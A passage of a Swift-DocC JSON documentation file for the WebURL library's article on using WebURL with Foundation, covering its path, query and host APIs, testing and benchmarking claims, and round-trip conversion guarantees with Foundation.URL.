"},{"type":"text","text":"features and algorithms - such as "},{"code":"map","type":"codeVoice"},{"type":"text","text":", "},{"code":"filter","type":"codeVoice"},{"type":"text","text":", and "},{"code":"reduce","type":"codeVoice"},{"type":"text","text":", not to mention slicing, such as "},{"code":"dropLast()","type":"codeVoice"},{"type":"text","text":"."},{"type":"text","text":" "},{"type":"text","text":"And you can even modify through this view, using indexes to perform complex operations super-efficiently."}],"type":"paragraph"},{"syntax":"swift","code":["let url = WebURL(\"https:\/\/github.com\/karwa\/swift-url\/issues\/63\")!","if url.pathComponents.dropLast().last == \"issues\",","  let issueNumber = url.pathComponents.last.flatMap(Int.init) {"," \/\/ ‚úÖ issueNumber = 63","}"],"type":"codeListing"},{"syntax":"swift","code":["var url = WebURL(\"https:\/\/info.myapp.com\")!","url.pathComponents += [\"music\", \"bands\" \"AC\/DC\"]","\/\/ ‚úÖ \"https:\/\/info.myapp.com\/music\/bands\/AC%2FDC\""],"type":"codeListing"},{"inlineContent":[{"text":"The ","type":"text"},{"type":"codeVoice","code":".formParams"},{"text":" view takes query parameters to the next level, with dynamic member lookup.","type":"text"},{"text":" ","type":"text"},{"text":"You just get and set values as if they were properties. Zero fuss:","type":"text"}],"type":"paragraph"},{"syntax":"swift","code":["var url = WebURL(\"https:\/\/example.com\/search?category=food&client=mobile\")!","url.formParams.category  \/\/ \"food\"","url.formParams.client    \/\/ \"mobile\"","","url.formParams.format = \"json\"","\/\/ ‚úÖ \"https:\/\/example.com\/search?category=food&client=mobile&format=json\"","\/\/                                                            ^^^^^^^^^^^"],"type":"codeListing"},{"inlineContent":[{"type":"text","text":"Here‚Äôs a challenge: with WebURL, that was 3 lines of super obvious code."},{"type":"text","text":" "},{"type":"text","text":"Now try doing that with "},{"type":"codeVoice","code":"Foundation.URL"},{"type":"text","text":". Yeah."}],"type":"paragraph"},{"inlineContent":[{"text":"The ","type":"text"},{"type":"codeVoice","code":".host"},{"text":" API is less frequently used, but even here we can offer a breakthrough in expressive, robust code.","type":"text"},{"text":" ","type":"text"},{"text":"With WebURL, the URL type tells applications ","type":"text"},{"inlineContent":[{"type":"text","text":"directly"}],"type":"emphasis"},{"text":" which computer the URL points to. I really love this.","type":"text"},{"text":" ","type":"text"},{"text":"I think this is ","type":"text"},{"inlineContent":[{"type":"text","text":"exactly"}],"type":"emphasis"},{"text":" what a Swift URL API should be; it takes a complex, nebulous string","type":"text"},{"text":" ","type":"text"},{"text":"and gives you simple, precise, structured values with strong guarantees.","type":"text"}],"type":"paragraph"},{"syntax":"swift","code":["let url = WebURL(\"http:\/\/127.0.0.1:8888\/my_site\")!","","guard url.scheme == \"http\" || url.scheme == \"https\" else {","  throw UnknownSchemeError()","}","switch url.host {","  case .domain(let name): ... \/\/ DNS lookup.","  case .ipv4Address(let address): ... \/\/ Connect to known address.","  case .ipv6Address(let address): ... \/\/ Connect to known address.","  case .opaque, .empty, .none: fatalError(\"Not possible for http\")","}"],"type":"codeListing"},{"inlineContent":[{"type":"text","text":"Come for the web-compatible URL parsing, or backwards-deployable IDN support;"},{"type":"text","text":" "},{"type":"text","text":"stay because literally everything else is lightyears ahead as well."}],"type":"paragraph"},{"inlineContent":[{"text":"And you can still hand values over to legacy ","type":"text"},{"code":"Foundation.URL","type":"codeVoice"},{"text":" code whenever you need to.","type":"text"},{"text":" ","type":"text"},{"text":"So you can take advantage of these APIs today, where you need them, without forcing everything to be rewritten.","type":"text"}],"type":"paragraph"}]},{"content":[{"type":"paragraph","inlineContent":[{"type":"text","text":"üìä It‚Äôs "},{"type":"emphasis","inlineContent":[{"text":"really","type":"text"}]},{"type":"text","text":" well tested."}]},{"type":"paragraph","inlineContent":[{"code":"WebURL","type":"codeVoice"},{"text":" is extensively tested by the Web Platform Tests. The WPT is a shared test database","type":"text"},{"text":" ","type":"text"},{"text":"used by the major browsers and other libraries; we pool our implementation experience to ensure that","type":"text"},{"text":" ","type":"text"},{"text":"any ambiguities or divergence is spotted and eliminated (sometimes the standard is ambiguous; that gets corrected).","type":"text"},{"text":" ","type":"text"},{"text":"The WebURL project has made a lot of contributions towards that effort, including finding and fixing issues","type":"text"},{"text":" ","type":"text"},{"text":"in browsers and elsewhere.","type":"text"}]},{"type":"paragraph","inlineContent":[{"type":"text","text":"This whole process is a really valuable positive cycle, and helps give you confidence that WebURL will work"},{"type":"text","text":" "},{"type":"text","text":"just like, say, Safari. We literally use the same test suite."}]},{"type":"paragraph","inlineContent":[{"type":"text","text":"Unfortunately, "},{"type":"codeVoice","code":"Foundation.URL"},{"type":"text","text":" simply cannot participate in that process, or anything like it."},{"type":"text","text":" "},{"type":"text","text":"Nobody‚Äôs writing new implementations of the obsolete RFC-2396."}]},{"type":"paragraph","inlineContent":[{"text":"The WPT alone is over 3x as large as Foundation‚Äôs test database, and includes much better quality test-cases","type":"text"},{"text":" ","type":"text"},{"text":"because it is exposed to the entire web and actively maintained. Foundation‚Äôs tests actually include","type":"text"},{"text":" ","type":"text"},{"text":"plenty of mistakes (!), so it actually tests incorrect behavior ü§¶‚Äç‚ôÇÔ∏è. My guess is that Foundation is not able","type":"text"},{"text":" ","type":"text"},{"text":"to fix those due to compatibility, but who knows? They don‚Äôt respond at all to any of the dozen or so bug reports","type":"text"},{"text":" ","type":"text"},{"text":"I‚Äôve filed, showing some pretty shocking bugs in ","type":"text"},{"code":"Foundation.URL","type":"codeVoice"},{"text":". That‚Äôs not even to mention that lots of","type":"text"},{"text":" ","type":"text"},{"text":"publicly-known URL exploits are actually monkey-patched in WebKit rather than being fixed at the source","type":"text"},{"text":" ","type":"text"},{"text":"(which is the buggy CFURL parser). Perhaps they can‚Äôt fix those, either? I don‚Äôt like to mention that kind of thing","type":"text"},{"text":" ","type":"text"},{"text":"due to responsible disclosure, but you deserve to know that your code might be vulnerable. The disclosure process","type":"text"},{"text":" ","type":"text"},{"text":"happened years ago.","type":"text"}]},{"type":"paragraph","inlineContent":[{"type":"text","text":"In contrast, testing has been a major focus of "},{"type":"codeVoice","code":"WebURL"},{"type":"text","text":" since the beginning. As well as the WPT,"},{"type":"text","text":" "},{"type":"text","text":"WebURL is tested by "},{"inlineContent":[{"type":"text","text":"hundreds"}],"type":"emphasis"},{"type":"text","text":" of additional tests, covering every aspect of its API. Our coverage is about 88%"},{"type":"text","text":" "},{"type":"text","text":"as of writing (generally regarded as excellent), and the gaps are mostly things that can‚Äôt easily be tested"},{"type":"text","text":" "},{"type":"text","text":"in Swift (such as assertion failures). And if "},{"inlineContent":[{"type":"text","text":"all of that"}],"type":"emphasis"},{"type":"text","text":" wasn‚Äôt enough, "},{"type":"codeVoice","code":"WebURL"},{"type":"text","text":" is regularly fuzz-tested,"},{"type":"text","text":" "},{"type":"text","text":"as are the URL type conversions. Because our checked conversions actually "},{"inlineContent":[{"type":"text","text":"account for bugs in Foundation"}],"type":"emphasis"},{"type":"text","text":" "},{"type":"text","text":"to make sure nothing slips through the cracks."}]},{"type":"paragraph","inlineContent":[{"text":"All of this means that you can have confidence adopting ","type":"text"},{"code":"WebURL","type":"codeVoice"},{"text":" ","type":"text"},{"inlineContent":[{"text":"right now","type":"text"}],"type":"emphasis"},{"text":".","type":"text"},{"text":" ","type":"text"},{"text":"Obviously nobody can guarantee zero bugs ever, but WebURL is a massive improvement - and as a Swift package,","type":"text"},{"text":" ","type":"text"},{"text":"any fixes can be implemented and deployed immediately. No more chucking bug reports in to a void","type":"text"},{"text":" ","type":"text"},{"text":"and being disappointed as year after year they go ignored and unfixed.","type":"text"}]}]},{"content":[{"inlineContent":[{"text":"üî• It‚Äôs blazing fast.","type":"text"}],"type":"paragraph"},{"inlineContent":[{"type":"codeVoice","code":"WebURL"},{"type":"text","text":" is regularly benchmarked, and comes out faster than "},{"type":"codeVoice","code":"Foundation.URL"},{"type":"text","text":" for "},{"type":"emphasis","inlineContent":[{"type":"text","text":"every"}]},{"type":"text","text":" operation;"},{"type":"text","text":" "},{"type":"text","text":"whether you‚Äôre parsing URL strings, modifying components, iterating through the path, etc."},{"type":"text","text":" "},{"type":"text","text":"In particular, it is "},{"type":"strong","inlineContent":[{"text":"orders of magnitude","type":"text"}]},{"type":"text","text":" faster on low-end\/IoT platforms like the Raspberry Pi,"},{"type":"text","text":" "},{"type":"text","text":"enabling applications which were previously so slow they‚Äôd be impractical."}],"type":"paragraph"}]}]},{"type":"heading","text":"A Note on Round-Tripping","anchor":"A-Note-on-Round-Tripping","level":2},{"inlineContent":[{"type":"text","text":"Round-tripping refers to taking a value (say, a "},{"type":"codeVoice","code":"WebURL"},{"type":"text","text":"), converting it to another type ("},{"type":"codeVoice","code":"Foundation.URL"},{"type":"text","text":"),"},{"type":"text","text":" "},{"type":"text","text":"and then converting back to the original type (to "},{"type":"codeVoice","code":"WebURL"},{"type":"text","text":" again). Some libraries and data structures need"},{"type":"text","text":" "},{"type":"text","text":"strong guarantees about that situation, so here it is:"}],"type":"paragraph"},{"type":"unorderedList","items":[{"content":[{"inlineContent":[{"type":"text","text":"A "},{"type":"codeVoice","code":"WebURL"},{"type":"text","text":" which can be converted to a "},{"type":"codeVoice","code":"Foundation.URL"},{"type":"text","text":" value can "},{"inlineContent":[{"text":"always","type":"text"}],"type":"strong"},{"type":"text","text":" be converted back to a "},{"type":"codeVoice","code":"WebURL"},{"type":"text","text":"."}],"type":"paragraph"}]},{"content":[{"type":"paragraph","inlineContent":[{"type":"text","text":"A "},{"code":"Foundation.URL","type":"codeVoice"},{"type":"text","text":" which can be converted to a "},{"code":"WebURL","type":"codeVoice"},{"type":"text","text":" can "},{"inlineContent":[{"text":"almost always","type":"text"}],"type":"strong"},{"type":"text","text":" be converted back to a "},{"code":"Foundation.URL","type":"codeVoice"},{"type":"text","text":"."}]},{"style":"note","type":"aside","name":"Note","content":[{"type":"paragraph","inlineContent":[{"text":"","type":"text"}]},{"type":"paragraph","inlineContent":[{"type":"text","text":"There is one, very rare situation where a Foundation -> WebURL conversion cannot be converted back:"},{"type":"text","text":" "},{"type":"text","text":"HTTP URLs whose hostnames contain percent-encoded special characters. These will get decoded by "},{"type":"codeVoice","code":"WebURL"},{"type":"text","text":","},{"type":"text","text":" "},{"type":"text","text":"but can‚Äôt be re-encoded for the conversion back to Foundation."}]},{"type":"codeListing","syntax":"swift","code":["(Foundation \"http:\/\/te%7Bs%7Dt\/\") -> (WebURL \"http:\/\/te{s}t\/\") -> (Rejected by Foundation)","                      ^^^ ^^^                          ^ ^"]},{"type":"paragraph","inlineContent":[{"type":"text","text":"These are not valid DNS domain names, so this is mostly a theoretical concern."},{"type":"text","text":" "},{"type":"text","text":"Generally, you can assume that Foundation -> WebURL conversion means the result can be converted back"},{"type":"text","text":" "},{"type":"text","text":"to a "},{"type":"codeVoice","code":"Foundation.URL"},{"type":"text","text":"."}]}]}]}]},{"inlineContent":[{"text":"Sometimes, when converting a ","type":"text"},{"code":"WebURL","type":"codeVoice"},{"text":" to Foundation, we need to add percent-encoding; this means the round-trip","type":"text"},{"text":" ","type":"text"},{"text":"result will not be equal to the original ","type":"text"},{"code":"WebURL","type":"codeVoice"},{"text":" value. However, you can use the ","type":"text"},{"code":"WebURL.encodedForFoundation","type":"codeVoice"},{"text":" ","type":"text"},{"text":"property to add that percent-encoding in advance; if this pre-encoded URL can be converted to a ","type":"text"},{"code":"Foundation.URL","type":"codeVoice"},{"text":",","type":"text"},{"text":" ","type":"text"},{"text":"it is guaranteed to round-trip to exactly the same ","type":"text"},{"code":"WebURL","type":"codeVoice"},{"text":" value.","type":"text"}],"type":"paragraph"},{"syntax":"swift","type":"codeListing","code":["func processURL(_ webURL: WebURL) throws {","","  let encodedWebURL = webURL.encodedForFoundation","  \/\/ ‚ÑπÔ∏è                     ^^^^^^^^^^^^^^^^^^^^^","  \/\/ Percent-encoding is added by default when converting to Foundation.","  \/\/ If we do it now, we know the round-trip result will equal 'encodedWebURL'.","","  guard let convertedURL = URL(encodedWebURL) else { throw InvalidURLError() }","","  \/\/ Do whatever you needed to do with Foundation... ","  let dataTask = URLSession.shared.dataTask(from: convertedURL)","  let urlFromDataTask = dataTask.originalRequest!.url!","","  \/\/ ‚úÖ A converted WebURL can always convert back. ","  let roundtripWebURL = WebURL(urlFromDataTask)!","","  \/\/ ‚úÖ The round-trip result is equal to 'encodedWebURL'. ","  assert(encodedWebURL == roundtripWebURL)","}"]},{"inlineContent":[{"text":"It is not generally possible to know in advance what the result of a ","type":"text"},{"code":"{Foundation -> WebURL -> Foundation}","type":"codeVoice"},{"text":" round-trip","type":"text"},{"text":" ","type":"text"},{"text":"will be. There is no equivalent of ","type":"text"},{"code":"WebURL.encodedForFoundation","type":"codeVoice"},{"text":" which normalizes a ","type":"text"},{"code":"Foundation.URL","type":"codeVoice"},{"text":".","type":"text"}],"type":"paragraph"}],"kind":"content"}],"kind":"article","schemaVersion":{"major":0,"minor":3,"patch":0},"metadata":{"role":"article","modules":[{"name":"WebURL"}],"title":"Using WebURL with Foundation","roleHeading":"Article"},"sections":[],"hierarchy":{"paths":[["doc:\/\/com.karwa.WebURL\/documentation\/WebURL"]]},"references":{"https://github.com/apple/swift-docc/blob/d94139a5e64e9ecf158214b1cded2a2880fc1b02/Sources/SwiftDocC/Model/TaskGroup.swift#L43-L44":{"identifier":"https:\/\/github.com\/apple\/swift-docc\/blob\/d94139a5e64e9ecf158214b1cded2a2880fc1b02\/Sources\/SwiftDocC\/Model\/TaskGroup.swift#L43-L44","titleInlineContent":[{"text":"don‚Äôt","type":"text"}],"url":"https:\/\/github.com\/apple\/swift-docc\/blob\/d94139a5e64e9ecf158214b1cded2a2880fc1b02\/Sources\/SwiftDocC\/Model\/TaskGroup.swift#L43-L44","type":"link","title":"don‚Äôt"},"doc://com.karwa.WebURL/documentation/WebURL":{"identifier":"doc:\/\/com.karwa.WebURL\/documentation\/WebURL","title":"WebURL","url":"\/documentation\/weburl","abstract":[{"type":"text","text":"A new URL type for Swift."}],"kind":"symbol","type":"topic","role":"collection"},"https://github.com/apple/swift-package-manager/blob/e25a590dc455baa430f2ec97eacc30257c172be2/Sources/PackageCollections/Model/Collection.swift#L116":{"identifier":"https:\/\/github.com\/apple\/swift-package-manager\/blob\/e25a590dc455baa430f2ec97eacc30257c172be2\/Sources\/PackageCollections\/Model\/Collection.swift#L116","titleInlineContent":[{"text":"here","type":"text"}],"url":"https:\/\/github.com\/apple\/swift-package-manager\/blob\/e25a590dc455baa430f2ec97eacc30257c172be2\/Sources\/PackageCollections\/Model\/Collection.swift#L116","type":"link","title":"here"},"https://github.com/apple/swift-package-manager/blob/e25a590dc455baa430f2ec97eacc30257c172be2/Sources/PackageCollections/PackageCollections%2BValidation.swift#L35":{"identifier":"https:\/\/github.com\/apple\/swift-package-manager\/blob\/e25a590dc455baa430f2ec97eacc30257c172be2\/Sources\/PackageCollections\/PackageCollections%2BValidation.swift#L35","titleInlineContent":[{"text":"here","type":"text"}],"url":"https:\/\/github.com\/apple\/swift-package-manager\/blob\/e25a590dc455baa430f2ec97eacc30257c172be2\/Sources\/PackageCollections\/PackageCollections%2BValidation.swift#L35","type":"link","title":"here"},"https://github.com/swift-server/async-http-client/blob/0f21b44d1ad5227ccbaa073aa40cd37eb8bbc337/Sources/AsyncHTTPClient/Scheme.swift#L42":{"identifier":"https:\/\/github.com\/swift-server\/async-http-client\/blob\/0f21b44d1ad5227ccbaa073aa40cd37eb8bbc337\/Sources\/AsyncHTTPClient\/Scheme.swift#L42","titleInlineContent":[{"text":"here","type":"text"}],"url":"https:\/\/github.com\/swift-server\/async-http-client\/blob\/0f21b44d1ad5227ccbaa073aa40cd37eb8bbc337\/Sources\/AsyncHTTPClient\/Scheme.swift#L42","type":"link","title":"here"},"https://github.com/swift-server/async-http-client/blob/0f21b44d1ad5227ccbaa073aa40cd37eb8bbc337/Sources/AsyncHTTPClient/DeconstructedURL.swift#L45":{"identifier":"https:\/\/github.com\/swift-server\/async-http-client\/blob\/0f21b44d1ad5227ccbaa073aa40cd37eb8bbc337\/Sources\/AsyncHTTPClient\/DeconstructedURL.swift#L45","titleInlineContent":[{"text":"here","type":"text"}],"url":"https:\/\/github.com\/swift-server\/async-http-client\/blob\/0f21b44d1ad5227ccbaa073aa40cd37eb8bbc337\/Sources\/AsyncHTTPClient\/DeconstructedURL.swift#L45","type":"link","title":"here"},"doc://com.karwa.WebURL/documentation/WebURL/WebURL/jsModel-swift.property":{"title":"jsModel","kind":"symbol","type":"topic","url":"\/documentation\/weburl\/weburl\/jsmodel-swift.property","role":"symbol","identifier":"doc:\/\/com.karwa.WebURL\/documentation\/WebURL\/WebURL\/jsModel-swift.property","fragments":[{"text":"var","kind":"keyword"},{"text":" ","kind":"text"},{"text":"jsModel","kind":"identifier"},{"text":": ","kind":"text"},{"preciseIdentifier":"s:6WebURLAAV","kind":"typeIdentifier","text":"WebURL"},{"kind":"text","text":"."},{"preciseIdentifier":"s:6WebURLAAV7JSModelV","kind":"typeIdentifier","text":"JSModel"}],"abstract":[{"text":"A read-write view of this URL with the same API as JavaScript‚Äôs ","type":"text"},{"code":"URL","type":"codeVoice"},{"text":" class.","type":"text"}]},"https://bugs.xdavidhu.me/google/2021/12/31/fixing-the-unfixable-story-of-a-google-cloud-ssrf/":{"identifier":"https:\/\/bugs.xdavidhu.me\/google\/2021\/12\/31\/fixing-the-unfixable-story-of-a-google-cloud-ssrf\/","titleInlineContent":[{"text":"a real vulnerability","type":"text"}],"url":"https:\/\/bugs.xdavidhu.me\/google\/2021\/12\/31\/fixing-the-unfixable-story-of-a-google-cloud-ssrf\/","type":"link","title":"a real vulnerability"}}}